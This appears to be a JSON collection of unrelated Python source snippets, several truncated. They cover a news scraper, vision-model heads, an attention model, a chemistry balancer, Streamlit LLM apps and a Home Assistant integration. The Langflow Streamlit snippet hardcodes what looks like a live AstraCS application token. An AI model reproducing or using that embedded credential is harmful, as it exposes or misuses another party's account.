\"mcpServers\" in config_json:\n                config_json = config_json[\"mcpServers\"]\n            #\u76f4\u63a5\u4f7f\u7528json\u914d\u7f6e\u91cc\u7684id\n            logging.info(f'add new mcp server: {config_json}')\n            server_id = list(config_json.keys())[0]\n            server_cmd = config_json[server_id][\"command\"]\n            server_args = config_json[server_id][\"args\"]\n            server_env = config_json[server_id][\"env\"]\n        except Exception as e:\n            status, msg = False, \"The config must be a valid JSON.\"\n\n    if  not re.match(r'^[a-zA-Z][a-zA-Z0-9_]*$', server_id):\n        status, msg = False, \"The server id must be a valid variable name!\"\n    elif server_id in st.session_state.mcp_servers.values():\n        status, msg = False, \"The server id exists, try another one!\"\n    elif not server_cmd or server_cmd not in mcp_command_list:\n        status, msg = False, \"The server command is invalid!\"\n    if server_env:\n        try:\n            serv",
    "# Import the required libraries\r\nfrom selenium import webdriver\r\nfrom selenium.webdriver.support import expected_conditions as EC\r\nfrom selenium.webdriver.support.ui import WebDriverWait\r\nfrom webdriver_manager.chrome import ChromeDriverManager\r\nfrom selenium.webdriver.chrome.service import Service\r\nfrom selenium.webdriver.common.by import By\r\nfrom google.cloud import translate_v2 as translate\r\nimport os\r\nimport requests\r\nimport re\r\n\r\n# Automatically download and use the correct ChromeDriver\r\nservice = Service(ChromeDriverManager().install())\r\ndriver = webdriver.Chrome(service=service)\r\n\r\n# Directory to save images\r\nimage_dir = \"article_images\"\r\nos.makedirs(image_dir, exist_ok=True)\r\n\r\n# Set the path to your Google Cloud credentials JSON file\r\nos.environ[\"GOOGLE_APPLICATION_CREDENTIALS\"] = \"decisive-coda-446415-j1-c4edbcf8e92c.json\"\r\n\r\n# Initialize Google Cloud Translate client\r\ntranslate_client = translate.Client()\r\n\r\n# Translate function using Google Cloud Translate API\r\ndef translate_text(text, target_language='en'):\r\n    result = translate_client.translate(text, target_language=target_language)  # Corrected argument name\r\n    return result['translatedText']\r\n\r\n# Try case handling\r\ntry:\r\n    # Debugger\r\n    print(\"Opening the Editoriales section...\")\r\n    \r\n    # Get the articles from the link\r\n    driver.get(\"https://elpais.com/opinion/editoriales/\")\r\n    \r\n    # Wait until the page loads completely\r\n    print(\"Waiting for the Editoriales page to load...\")\r\n    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, \"body\")))\r\n\r\n    print(\"Editoriales page loaded.\")\r\n\r\n    # Handle the cookies popup using the provided XPath\r\n    try:\r\n        # Debugger\r\n        print(\"Looking for the cookies popup...\")\r\n        \r\n        # Accept the cookies\r\n        cookies_button = WebDriverWait(driver, 10).until(\r\n            EC.element_to_be_clickable((By.XPATH, '//*[@id=\"didomi-notice-agree-button\"]'))\r\n        )\r\n        cookies_button.click()\r\n        \r\n        # Debugger\r\n        print(\"Cookies popup accepted.\")\r\n    \r\n    except Exception as e:\r\n        print(\"Cookies popup not found or already handled:\", e)\r\n\r\n    # Initialize a dictionary to store articles\r\n    articles_dict = {}\r\n    article_links = []\r\n\r\n    # Locate all article elements inside the main div\r\n    print(\"Fetching links for the top 5 articles...\")\r\n    main_div = WebDriverWait(driver, 10).until(\r\n        EC.presence_of_element_located((By.XPATH, '/html/body/main/div/div[2]'))\r\n    )\r\n\r\n    # Get the top 5 articles\r\n    articles = main_div.find_elements(By.TAG_NAME, \"article\")[:5]  # Get top 5 articles\r\n\r\n    # Collect links for the top 5 articles\r\n    for index, article in enumerate(articles, 1):\r\n        # Get the titles\r\n        title_element = article.find_element(By.XPATH, './header/h2/a')\r\n        \r\n        # Extract the text of the title\r\n        title = title_element.text\r\n\r\n        # Extract the link\r\n        link = title_element.get_attribute(\"href\")\r\n        \r\n        # Append to the articles list\r\n        article_links.append((title, link))\r\n        \r\n        # Debugger\r\n        print(f\"Article {index} Title: {title} | Link: {link}\")\r\n\r\n    # Navigate to each article using the stored links\r\n    for index, (title, link) in enumerate(article_links, 1):\r\n        # Debugger\r\n        print(f\"\\nProcessing Article {index}: {title} ({link})\")\r\n\r\n        # Navigate to the article page\r\n        driver.get(link)\r\n\r\n        # Wait for the specific content to load inside the article\r\n        print(f\"Fetching content for Article {index}...\")\r\n        article_content = WebDriverWait(driver, 10).until(\r\n            EC.presence_of_element_located((By.XPATH, '/html/body/article/div[2]'))\r\n        )\r\n        content_text = article_content.text\r\n\r\n        # Store the title and content in the dictionary\r\n        articles_dict[title] = content_text\r\n        print(f\"Content for Article {index} fetched.\")\r\n\r\n        # Fetch the image from the article\r\n        try:\r\n            print(f\"Fetching image for Article {index}...\")\r\n            image_element = driver.find_element(By.XPATH, '/html/body/article/header/div[2]/figure/span/img')\r\n            image_url = image_element.get_attribute(\"src\")\r\n\r\n            # Download the image\r\n            response = requests.get(image_url)\r\n            if response.status_code == 200:\r\n                image_path = os.path.join(image_dir, f\"article_{index}.jpg\")\r\n                with open(image_path, \"wb\") as img_file:\r\n                    img_file.write(response.content)\r\n                print(f\"Image for Article {index} saved at {image_path}.\")\r\n            else:\r\n                print(f\"Failed to download image for Article {index}.\")\r\n        except Exception as e:\r\n            print(f\"Image not found for Article {index}: {e}\")\r\n\r\n    # Print the results\r\n    print(\"\\nArticles fetched: \")\r\n    for title, content in articles_dict.items():\r\n        print(f\"\\nTitle: {title}\\nContent: {content}\\n\")\r\n\r\n ",
    "# Copyright (C) 2024-present Naver Corporation. All rights reserved.\n# Licensed under CC BY-NC-SA 4.0 (non-commercial use only).\n#\n# --------------------------------------------------------\n# dpt head implementation for DUST3R\n# Downstream heads assume inputs of size B x N x C (where N is the number of tokens) ;\n# or if it takes as input the output at every layer, the attribute return_all_layers should be set to True\n# the forward function also takes as input a dictionnary img_info with key \"height\" and \"width\"\n# for PixelwiseTask, the output will be of dimension B x num_channels x H x W\n# --------------------------------------------------------\nfrom einops import rearrange\nfrom typing import List\nimport torch\nimport torch.nn as nn\nfrom dust3r.heads.postprocess import postprocess\nimport dust3r.utils.path_to_croco  # noqa: F401\nfrom models.dpt_block import DPTOutputAdapter  # noqa\n\n\nclass DPTOutputAdapter_fix(DPTOutputAdapter):\n    \"\"\"\n    Adapt croco's DPTOutputAdapter implementation for dust3r:\n    remove duplicated weigths, and fix forward for dust3r\n    \"\"\"\n\n    def init(self, dim_tokens_enc=768):\n        super().init(dim_tokens_enc)\n        # these are duplicated weights\n        del self.act_1_postprocess\n        del self.act_2_postprocess\n        del self.act_3_postprocess\n        del self.act_4_postprocess\n\n    def forward(self, encoder_tokens: List[torch.Tensor], image_size=None):\n        assert self.dim_tokens_enc is not None, 'Need to call init(dim_tokens_enc) function first'\n        # H, W = input_info['image_size']\n        image_size = self.image_size if image_size is None else image_size\n        H, W = image_size\n        # Number of patches in height and width\n        N_H = H // (self.stride_level * self.P_H)\n        N_W = W // (self.stride_level * self.P_W)\n\n        # Hook decoder onto 4 layers from specified ViT layers\n        layers = [encoder_tokens[hook] for hook in self.hooks]\n\n        # Extract only task-relevant tokens and ignore global tokens.\n        layers = [self.adapt_tokens(l) for l in layers]\n\n        # Reshape tokens to spatial representation\n        layers = [rearrange(l, 'b (nh nw) c -> b c nh nw', nh=N_H, nw=N_W) for l in layers]\n\n        layers = [self.act_postprocess[idx](l) for idx, l in enumerate(layers)]\n        # Project layers to chosen feature dim\n        layers = [self.scratch.layer_rn[idx](l) for idx, l in enumerate(layers)]\n\n        # Fuse layers using refinement stages\n        path_4 = self.scratch.refinenet4(layers[3])[:, :, :layers[2].shape[2], :layers[2].shape[3]]\n        path_3 = self.scratch.refinenet3(path_4, layers[2])\n        path_2 = self.scratch.refinenet2(path_3, layers[1])\n        path_1 = self.scratch.refinenet1(path_2, layers[0])\n\n        # Output head\n        out = self.head(path_1)\n\n        return out\n\n\nclass PixelwiseTaskWithDPT(nn.Module):\n    \"\"\" DPT module for dust3r, can return 3D points + confidence for all pixels\"\"\"\n\n    def __init__(self, *, n_cls_token=0, hooks_idx=None, dim_tokens=None,\n                 output_width_ratio=1, num_channels=1, postprocess=None, depth_mode=None, conf_mode=None, **kwargs):\n        super(PixelwiseTaskWithDPT, self).__init__()\n        self.return_all_layers = True  # backbone needs to return all layers\n        self.postprocess = postprocess\n        self.depth_mode = depth_mode\n        self.conf_mode = conf_mode\n\n        assert n_cls_token == 0, \"Not implemented\"\n        dpt_args = dict(output_width_ratio=output_width_ratio,\n                        num_channels=num_channels,\n                        **kwargs)\n        if hooks_idx is not None:\n            dpt_args.update(hooks=hooks_idx)\n        self.dpt = DPTOutputAdapter_fix(**dpt_args)\n        dpt_init_args = {} if dim_tokens is None else {'dim_tokens_enc': dim_tokens}\n        self.dpt.init(**dpt_init_args)\n\n    def forward(self, x, img_info):\n        out = self.dpt(x, image_size=(img_info[0], img_info[1]))\n        if self.postprocess:\n            out = self.postprocess(out, self.depth_mode, self.conf_mode)\n        return out\n\n\ndef create_dpt_head(net, has_conf=False):\n    \"\"\"\n    return PixelwiseTaskWithDPT for given net params\n    \"\"\"\n    assert net.dec_depth > 9\n    l2 = net.dec_depth\n    feature_dim = 256\n    last_dim = feature_dim//2\n    out_nchan = 3\n    ed = net.enc_embed_dim\n    dd = net.dec_embed_dim\n    return PixelwiseTaskWithDPT(num_channels=out_nchan + has_conf,\n                                feature_dim=feature_dim,\n                                last_dim=last_dim,\n                                hooks_idx=[0, l2*2//4, l2*3//4, l2],\n                                dim_tokens=[ed, dd, dd, dd],\n                                postprocess=postprocess,\n                                depth_mode=net.depth_mode,\n                                conf_mode=net.conf_mode,\n                                head_type='regression')\n",
    "import os\r\nimport win32api\r\nfrom pathlib import Path\r\nimport shutil\r\n\r\n#You don't need to call this script manually by terminal!\r\n#This code will search for existing \"Slides\" path in main root of any drive that represented as physical drive\r\n#And it will import and replace all existing images with \"sld{number}.png\" name and extension format.\r\ndef import_imgs():\r\n    \"\"\"This will import slides from ``Slides-folder`` in main root ``Like:X:/Slides`` of any physical driver or USB-stick.\r\n\r\n    Return:\r\n        If your local ``Slides-folder`` was empty, it will raise a corruption error.\r\n    \"\"\"\r\n    log_val = []\r\n    try:\r\n        dev_dir=\"\"\r\n        drives = win32api.GetLogicalDriveStrings().split('\\x00')[:-1]\r\n        log_val.append(f\"Drives found -> {drives}\")\r\n        for device in drives:\r\n\r\n            path= Path(f\"{device}Slides\")\r\n            if Path.exists(path) and os.listdir(path):\r\n                dev_dir= f\"{device}Slides\"\r\n                break\r\n        ct=0\r\n        if dev_dir:\r\n            for entry in os.listdir(\"Slides\"):\r\n                os.remove(f\"Slides/{entry}\")\r\n            for entry in os.listdir(dev_dir):\r\n                full_path = os.path.join(dev_dir, entry)\r\n                shutil.copyfile(full_path, f\"Slides/sld{ct}.png\")\r\n                ct+=1\r\n            log_val.append(f\"Slides load from driver -> Successfully {len(os.listdir(dev_dir))} slides imported.\")\r\n        else:   log_val.append(f\"Slides load from drive err -> Path/driver doesn't exist or Null. -> To import slides, please install driver or declare proper slides-path in main root.\")\r\n    except Exception as err:\r\n        log_val.append(f\"Drivers import err -> {err}\")\r\n    return log_val",
    "\n\nfrom serpapi import GoogleSearch\n\ndef google_search(query: str):\n    \"\"\"\n    Search Google using a query.\n\n    Args:\n        query (str): The search query.\n\n    Returns:\n        str: A concatenated list of the top search results.\n    \"\"\"\n    \n    # \u53ef\u4ee5\u7528 https://serpapi.com/playground \u4e00\u952e\u751f\u6210Query\u4ee3\u7801\n    params = {\n      \"api_key\": \"Replace with your serpapi_key here https://serpapi.com/dashboard\",\n      \"engine\": \"google\",\n      \"q\": query,\n      \"location\": \"XXX\",\n      \"google_domain\": \"google.com\",\n      \"gl\": \"us\",\n      \"hl\": \"en\",\n      \"cr\": \"countryCN|countryUS|countryTW|countryHK|countryJP\",\n      \"device\": \"desktop\",\n      \"lr\": \"lang_zh-CN|lang_zh-TW|lang_en|lang_ja\"\n    }\n    \n    search = GoogleSearch(params)\n    results = search.get_dict()\n    return results\n    \n    # TODO replace this with a real query to Google, e.g. by using serpapi (https://serpapi.com/integrations/python)\n    # dummy_message = \"The search tool is currently offline for regularly scheduled maintenance.\"\n    # return dummy_message",
    "import torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nimport tiktoken\nfrom dataclasses import dataclass\n\n\nbatch_size = 64\nblock_size = 256\nmax_iters = 5000\neval_interval = 500\nlearning_rate = 3e-4\ndevice = \"cuda\" if torch.cuda.is_available() else \"cpu\"\neval_iters = 200\nn_embed = 384\nn_head = 6\nn_layer = 6\ndropout = 0.2\n\ndef load_data_fromfile(filename):\n    with open(filename, 'r', encoding='utf-8') as file:\n        text = file.read()\n    return text\n\ndef tokenize(data):\n    # uses tiktoken\n    encoder = tiktoken.get_encoding('gpt2')\n    tokens = encoder.encode(data)\n    return tokens\n\nclass TextLoader:\n    \"\"\"\n    Simple batch loader for text data, tokenizes everything,\n    then yields (input, target) pairs in chunks of (B, T).\n    \"\"\"\n    def __init__(self, B, T):\n        self.B = B\n        self.T = T\n        data = load_data_fromfile('input.txt')\n        tokens = tokenize(data)\n        self.tokens = torch.tensor(tokens, dtype=torch.long)\n        print(f\"loaded {len(self.tokens)} tokens\")\n        print(f\"processing {(len(self.tokens)) // (B*T)} batches per epoch\")\n        self.cur_pos = 0\n\n    def next_batch(self):\n        B,T = self.B, self.T\n        end_pos = self.cur_pos + B*T + 1\n        buffer = self.tokens[self.cur_pos:end_pos]\n        x = buffer[:-1].view(B, T)\n        y = buffer[1:].view(B, T)\n\n        self.cur_pos += B*T\n        if self.cur_pos + B*T + 1 > len(self.tokens):\n            self.cur_pos = 0\n        return x, y\n\n\n@dataclass\nclass Config:\n    block_size: int = 1024    # max sequence length\n    vocab_size: int = 50257   # GPT-2 BPE vocab size\n    n_layer: int = 12\n    # Additional fields for MLA usage\n    d_model: int = 768\n    n_heads: int = 12\n\n\nclass MLA(nn.Module):\n    '''\n        Ropeless implementation of MLA with KVCache\n    '''\n    def __init__(self, config):\n        super().__init__()\n        self.d_model = config.d_model  # e.g. 384\n        self.n_heads = config.n_heads  # e.g. 6\n\n        # Dimension splits\n        self.q_proj = self.d_model // 2            \n        self.kv_proj = (2 * self.d_model) // 3     \n        self.dh = self.d_model // self.n_heads     \n\n    \n        # \"Down\" from d_model \u2192 q_proj, then LN, then \"Up\" from q_proj \u2192 d_model.\n        self.W_dq = nn.Parameter(0.01 * torch.randn((self.d_model, self.q_proj)))  # (384,192)\n        self.W_uq = nn.Parameter(0.01 * torch.randn((self.q_proj, self.d_model)))  # (192,384)\n        self.Q_layernorm = nn.LayerNorm(self.q_proj)\n\n        \n        # \"Down\" from d_model\u21922*kv_proj (e.g. 384\u2192512), LN, then \"Up\" 512\u21922*d_model=768\n        \n        self.W_dkv = nn.Parameter(0.01 * torch.randn((self.d_model, 2 * self.kv_proj)))   # (384,512)\n        self.W_ukv = nn.Parameter(0.01 * torch.randn((2 * self.kv_proj, 2 * self.d_model)))  # (512,768)\n        self.KV_layernorm = nn.LayerNorm(2 * self.kv_proj)\n\n        # final output projection\n        self.W_o = nn.Parameter(0.01 * torch.randn((self.d_model, self.d_model)))  # (384,384)\n\n    def forward(self, x, KV=None, prev_seq_length=0):\n        \"\"\"\n        x: (B, T, d_model)\n        KV: tuple of (k_cache, v_cache) if using caching\n        prev_seq_length: number of tokens previously processed (for partial masking)\n        \"\"\"\n        B, T, C = x.shape  # e.g. (B, T, 384)\n\n        \n        compressed_q = x @ self.W_dq              # (B, T, q_proj)\n        compressed_q = self.Q_layernorm(compressed_q)\n        Q = compressed_q @ self.W_uq              # (B, T, C )\n\n        #KV path: down -> LN -> up, then split\n        compressed_kv = x @ self.W_dkv            # (B, T, C)\n        compressed_kv = self.KV_layernorm(compressed_kv)\n        kv_out = compressed_kv @ self.W_ukv       # (B, T, d_model)\n  \n        K, V = torch.split(kv_out, C, dim=-1)     # K,V => (B, T, d_model)\n\n        # reshape for multi-head attention\n        Q_heads = Q.view(B, T, self.n_heads, self.dh).transpose(1, 2)  # (B, nHeads, T, dh)\n        K_heads = K.view(B, T, self.n_heads, self.dh).transpose(1, 2)  \n        V_heads = V.view(B, T, self.n_heads, self.dh).transpose(1, 2)  \n\n        \n        if KV is not None:\n            k_cache, v_cache = KV\n            K_heads = torch.cat([k_cache, K_heads], dim=2)  \n            V_heads = torch.cat([v_cache, V_heads], dim=2)\n\n        T_full = K_heads.size(2)  # total length (old + new)\n\n        # create lower-triangular mask (shift by prev seq length)\n        mask = torch.ones((T, T_full), device=x.device)\n        mask = torch.tril(mask, diagonal=0 + prev_seq_length)\n        sq_mask = (mask == 1)\n\n        # dot-product attention\n        out = F.scaled_dot_product_attention(\n            Q_heads, K_heads, V_heads,\n            attn_mask=sq_mask\n        )\n        \n        out = out.transpose(1, 2).reshape(B, T, C)\n        out = out @ self.W_o.T  # final linear layer\n\n        # return output plus new caches\n        return out, (K_heads, V_heads)\n\n\nclass MLP(nn.Module):\n    def __init__(self, config):\n        super().__init__()\n        self.c_fc = nn.Linear(config.n_embe",
    "from sympy import *\r\ninit_printing(use_unicode=True)\r\nimport math\r\nimport re\r\n# H3PO4 + (NH4)2MoO4 + HNO3 + H2O-> (NH4)3PO4.12MoO3 + NH4NO3\r\n\r\n\r\ndef subscript(s):  # Function to convert number to subscript. 8320 is the ascii of subscript 0\r\n    i = 0\r\n    while i < len(s):\r\n        if s[i].isdigit() and (s[i - 1].isalpha() or s[i - 1] == \")\" or ord(s[i - 1]) in range(8320, 8340)):\r\n            s = s[0:i] + \"[sub]\" + s[i] + \"[/sub]\" + s[i + 1:]\r\n            print(s)\r\n        i += 1\r\n    s = s.replace(\"[b]\", \"[b][color=000080]\").replace(\"[/b]\", \"[/b][/color]\")\r\n    return s\r\n\r\n\r\ndef format_compound(formula):\r\n    f_formula = \"\"\r\n    for part in formula.split(\".\"):\r\n        for i in range(0, len(part)):\r\n            if i + 1 < len(part):\r\n                if part[i].isalpha() and (part[i + 1].isupper() or part[i + 1] in [\"(\", \"[\", \")\", \"]\"]):\r\n                    f_formula += part[i] + \"1\"\r\n                elif part[i] in [\")\", \"]\"] and part[i + 1].isalpha():\r\n                    f_formula += part[i] + \"1\"\r\n                else:\r\n                    f_formula += part[i]\r\n            else:\r\n                if part[i].isalpha() or part[i] in [\")\", \"]\"]:\r\n                    f_formula += part[i] + \"1\"\r\n                else:\r\n                    f_formula += part[i]\r\n        f_formula += (\".\" if len(formula.split(\".\")) > 1 else \"\")\r\n    if f_formula.find(\".\") > -1:\r\n        part = f_formula.split(\".\")\r\n        val = str(re.findall('[0-9][0-9]*', part[1])[0])\r\n        val = (\"1\" if val == \"\" else val)\r\n        f_formula = part[0] + \\\r\n            \"(\" + str(re.findall('[A-Za-z]\\S*', part[1])[0]) + \")\" + val\r\n    return f_formula\r\n\r\n\r\ndef open_brackets(formula):  # Function to open the brackets\r\n    formula_br = re.findall('\\((.*?)\\)', formula)\r\n    m = re.findall('\\)([0-9][0-9]*)', formula)\r\n    for (i, indexc) in zip(formula_br, range(0, len(formula_br))):\r\n        f_formula = \"\"\r\n        val = re.findall('[0-9][0-9]*', i)\r\n        for (n, indexv) in zip(val, range(0, len(val))):\r\n            f_formula += re.findall('([A-Za-z][A-Za-z]*)', i)[indexv]\r\n            f_formula += str(int(n) * int(m[indexc]))\r\n        formula = formula.replace(re.findall(\r\n            '(\\(.*?\\)[0-9]*)', formula)[0], f_formula)\r\n    return formula\r\n\r\n\r\ndef simplify(formula):  # Function to simplify the molecular formula by using the above functions\r\n    formula = format_compound(formula)\r\n    formula = open_brackets(formula)\r\n    formula = formula.replace(\"[\", \"(\").replace(\"]\", \")\")\r\n    formula = open_brackets(formula)\r\n    return formula\r\n\r\n\r\nall_elements = list()  # A list of all the elements in the list\r\n\r\n\r\nclass compound(object):  # A class of compounds. I contains all the attributes of each compound\r\n    def __init__(self, compound_n):\r\n        self.compound_n = compound_n  # It stores the original molecular formula\r\n        # It stores the simplified molecular formula\r\n        self.compound_f = simplify(self.compound_n)\r\n        # Dict containing all the elements and number of atoms of each element\r\n        self.elements = dict()\r\n        for (val, element) in zip(re.findall('[0-9][0-9]*', self.compound_f), re.findall('[A-Za-z][A-Za-z]*', self.compound_f)):\r\n            self.elements[element] = str(\r\n                int(self.elements.get(element, \"0\")) + int(val))\r\n            if element not in all_elements:\r\n                all_elements.append(element)\r\n\r\n\r\ndef balance(equation):\r\n    if not isValid(equation):\r\n        return \"Invalid Equation\"\r\n\r\n    try:\r\n        equation = equation.replace(\"->\", \"+\").replace(\" \", \"\")\r\n\r\n        compounds = []  # A list of objects of the class 'compound'\r\n        for compound_n in equation.split(\"+\"):\r\n            compounds.append(compound(compound_n))\r\n\r\n        cols = len(compounds)\r\n        rows = len(all_elements)\r\n        # Matrix which solves the system of linear equations\r\n        m = (zeros(rows, cols))\r\n\r\n        for c in range(0, int(cols)):  # Inserting the values into the matrix\r\n            for r in range(0, int(rows)):\r\n                try:\r\n                    m[r, c] = compounds[c].elements[all_elements[r]]\r\n                except:\r\n                    m[r, c] = 0\r\n\r\n        # Converting the matrix to RREF form and removing the list of pivots\r\n        m = list(m.rref())[0]\r\n\r\n        coefficients = list()\r\n        denominator = list()\r\n\r\n        for r in range(0, rows):  # Storing the coefficints in the lists\r\n            if m[r, cols - 1] == 0:\r\n                break\r\n            else:\r\n                coefficients.append(int(str(m[r, cols - 1]).split(\"/\")[0]))\r\n                try:\r\n                    denominator.append(int(str(m[r, cols - 1]).split(\"/\")[1]))\r\n                except:\r\n                    denominator.append(1)\r\n        coefficients.append(1)\r\n        denominator.append(1)\r\n\r\n        lcm = denominator[0]\r\n        for num in denominator[1:]:  # Calculating the lcm of the denominators\r\n            lcm = int(int(lcm * num) / int(math.gcd(lcm, num)))\r\n\r\n        rhs ",
    "import streamlit as st\nfrom typing import Optional\nimport requests\n\n# Constants\nBASE_API_URL = \"https://api.langflow.astra.datastax.com\"\nLANGFLOW_ID = \"266a92da-f25d-4350-a70c-ec9984ba99fa\"\nFLOW_ID = \"ad67d18e-ed45-425f-8380-4b5400c22da8\"\nAPPLICATION_TOKEN = \"AstraCS:KNdzFoKJPxfknxafnBRskSlU:716d3c301ec704125d2f0953f7ae1c60d9010f1e8c9a693aa4ef9de66a1b47c2\"\nTWEAKS = {\n    \"ChatInput-9vauS\": {},\n    \"ChatOutput-TojAu\": {},\n    \"OpenAIModel-SPpeb\": {},\n    \"File-pcWQi\": {},\n    \"AstraDB-H0bkV\": {},\n    \"OpenAIEmbeddings-59oyL\": {},\n    \"Prompt-4Mipb\": {},\n    \"ParseData-fWDBv\": {},\n    \"AstraDB-Rk1Mh\": {},\n    \"OpenAIEmbeddings-diXrs\": {},\n    \"SplitText-Qz9ua\": {}\n}\n\n# Function to run the flow\ndef run_flow(\n    message: str,\n    endpoint: str,\n    output_type: str = \"chat\",\n    input_type: str = \"chat\",\n    tweaks: Optional[dict] = None,\n    application_token: Optional[str] = None\n) -> dict:\n    api_url = f\"{BASE_API_URL}/lf/{LANGFLOW_ID}/api/v1/run/{endpoint}\"\n\n    payload = {\n        \"input_value\": message,\n        \"output_type\": output_type,\n        \"input_type\": input_type,\n    }\n    if tweaks:\n        payload[\"tweaks\"] = tweaks\n\n    headers = {\n        \"Authorization\": f\"Bearer {application_token}\",\n        \"Content-Type\": \"application/json\"\n    }\n\n    response = requests.post(api_url, json=payload, headers=headers)\n    try:\n        response.raise_for_status()\n        return response.json()\n    except requests.exceptions.RequestException as e:\n        return {\"error\": str(e)}\n\n# Streamlit UI\nst.title(\"EngageMetrics\")\nst.subheader(\"Your Personal Social Media Analyst!\")\n\n# Input fields\nmessage = st.text_area(\"Prompt\", placeholder=\"Enter your prompt here...\")\nendpoint = FLOW_ID\noutput_type = \"chat\"\ninput_type = \"chat\"\n\n# Run button\nif st.button(\"Analyse\"):\n    if not message.strip():\n        st.error(\"Input Message cannot be empty!\")\n    else:\n        with st.spinner(\"Running the flow...\"):\n            response = run_flow(\n                message=message,\n                endpoint=endpoint,\n                output_type=output_type,\n                input_type=input_type,\n                tweaks=TWEAKS,\n                application_token=APPLICATION_TOKEN\n            )\n        \n        if \"error\" in response:\n            st.text(\"Something went wrong!, Try again later.\")\n            print(f\"Error: {response['error']}\")\n        else:\n            st.success(\"Flow executed successfully!\")\n            try:\n                # Extract the final output text\n                final_output = (\n                    response.get(\"outputs\", [{}])[0]\n                    .get(\"outputs\", [{}])[0]\n                    .get(\"results\", {})\n                    .get(\"message\", {})\n                    .get(\"text\", \"No final text found.\")\n                )\n                st.markdown(f\"### Final Output:\\n\\n{final_output}\")\n            except Exception as e:\n                st.error(f\"Unexpected response structure: {e}\")\n                st.text(\"Unable to process the output.\")\n",
    "import streamlit as st\nimport google.generativeai as genai\nimport os\nimport PyPDF2\nfrom io import BytesIO\nfrom dotenv import load_dotenv\nfrom google.api_core import retry\nimport time\n\nst.set_page_config(layout=\"centered\")\nload_dotenv()\n\nAPI_KEY = os.getenv(\"GOOGLE_API_KEY\")\nif not API_KEY:\n    st.error(\"Please set your Google API key in the .env file\")\n    st.stop()\n\ngenai.configure(api_key=API_KEY)\nmodel = genai.GenerativeModel('gemini-pro')\n\n# Initialize session states\nif \"messages\" not in st.session_state:\n    st.session_state.messages = []\nif \"current_question\" not in st.session_state:\n    st.session_state.current_question = 0\nif \"resume_analyzed\" not in st.session_state:\n    st.session_state.resume_analyzed = False\nif \"interview_complete\" not in st.session_state:\n    st.session_state.interview_complete = False\n\n# Function to process PDF\ndef process_pdf(uploaded_file):\n    try:\n        pdf_bytes = BytesIO(uploaded_file.read())\n        pdf_reader = PyPDF2.PdfReader(pdf_bytes)\n        text = \"\"\n        for page in pdf_reader.pages:\n            text += page.extract_text()\n        return text\n    except Exception as e:\n        st.error(f\"Error processing PDF: {str(e)}\")\n        return \"\"\n\n# Function to generate questions based on resume\ndef generate_questions(resume_text):\n    max_retries = 3\n    retry_delay = 2  \n    \n    for attempt in range(max_retries):\n        try:\n            prompt = f\"\"\"Based on this resume: {resume_text}\n            Generate 5 relevant interview questions. Return ONLY an array of questions.\"\"\"\n            \n            response = model.generate_content(\n                prompt,\n                generation_config={\n                    \"temperature\": 0.7,\n                    \"top_p\": 0.8,\n                    \"top_k\": 40,\n                    \"max_output_tokens\": 1024,\n                }\n            )\n            \n            questions = response.text.strip().split('\\n')\n            return [q.strip().strip('0123456789.') for q in questions if q.strip()]\n            \n        except Exception as e:\n            if attempt < max_retries - 1:\n                st.warning(f\"Attempt {attempt + 1} failed. Retrying in {retry_delay} seconds...\")\n                time.sleep(retry_delay)\n                continue\n            else:\n                st.error(f\"Failed to generate questions after {max_retries} attempts. Error: {str(e)}\")\n                return [\"What are your key strengths?\",\n                        \"Tell me about your most challenging project.\",\n                        \"Where do you see yourself in 5 years?\",\n                        \"What made you choose your field of study/work?\",\n                        \"How do you handle difficult situations at work?\"]\n\n# Main UI\nst.title(\"Resume Analysis & Interview Bot \ud83e\udd16\")\n\n# PDF Upload Section\nif not st.session_state.resume_analyzed:\n    uploaded_file = st.file_uploader(\"Upload your resume (PDF)\", type=['pdf'])\n    if uploaded_file:\n        with st.spinner('Analyzing resume...'):\n            resume_text = process_pdf(uploaded_file)\n            if resume_text:  # Only proceed if PDF processing was successful\n                st.session_state.questions = generate_questions(resume_text)\n                st.session_state.resume_analyzed = True\n                st.rerun()\n            else:\n                st.error(\"Failed to process the PDF. Please try again with a different file.\")\n\n# Interview Section\nif st.session_state.resume_analyzed and not st.session_state.interview_complete:\n    if st.session_state.current_question < len(st.session_state.questions):\n        st.write(f\"### Question {st.session_state.current_question + 1}:\")\n        st.write(st.session_state.questions[st.session_state.current_question])\n        \n        user_answer = st.text_area(\"Your answer:\", key=f\"answer_{st.session_state.current_question}\")\n        \n        if st.button(\"Next Question\"):\n            if user_answer:\n                st.session_state.messages.append((\"Question\", st.session_state.questions[st.session_state.current_question]))\n                st.session_state.messages.append((\"Answer\", user_answer))\n                st.session_state.current_question += 1\n                if st.session_state.current_question >= len(st.session_state.questions):\n                    st.session_state.interview_complete = True\n                st.rerun()\n            else:\n                st.error(\"Please provide an answer before continuing.\")\n\n# Feedback Section\nif st.session_state.interview_complete:\n    if \"feedback_given\" not in st.session_state:\n        with st.spinner('Generating feedback...'):\n            feedback_prompt = \"Based on these interview responses:\\n\"\n            for i in range(0, len(st.session_state.messages), 2):\n                feedback_prompt += f\"\\nQ: {st.session_state.messages[i][1]}\\nA: {st.session_state.messages[i+1][1]}\\n\"\n            feedback_prompt += \"\\nProvide a comprehensive feedback on the interview responses, including strengths and areas for improvement.\"\n       ",
    "\"\"\"\nFlux de configurare pentru integrarea Hidroelectrica Rom\u00e2nia.\n\"\"\"\n\nimport logging\nimport voluptuous as vol\n\nfrom homeassistant import config_entries\nfrom homeassistant.core import callback\nfrom homeassistant.helpers import selector\n\n# Import\u0103m constantele noastre\nfrom .const import (\n    DOMAIN,\n    CONF_USERNAME,\n    CONF_PASSWORD,\n    CONF_UPDATE_INTERVAL,\n    DEFAULT_UPDATE_INTERVAL,\n    MIN_UPDATE_INTERVAL,\n    MAX_UPDATE_INTERVAL,\n)\n\n_LOGGER = logging.getLogger(__name__)\n\n\nclass HidroelectricaConfigFlow(config_entries.ConfigFlow, domain=DOMAIN):\n    \"\"\"\n    Clasa principal\u0103 de flux de configurare pentru Hidroelectrica.\n    Aceasta este punctul de intrare c\u00e2nd utilizatorul adaug\u0103 integrarea din UI.\n    \"\"\"\n\n    VERSION = 1  # Versiunea fluxului de configurare\n\n    def __init__(self):\n        \"\"\"\n        Constructor simplu. Dac\u0103 avem nevoie de variabile temporare,\n        le definim aici.\n        \"\"\"\n        self._errors = {}\n\n    async def async_step_user(self, user_input=None):\n        \"\"\"\n        Primul pas din config flow. Solicit\u0103 user \u0219i parola, precum \u0219i update interval.\n        \n        :param user_input: Datele introduse de utilizator (dic\u021bionar)\n        :return: Un dic\u021bionar care descrie 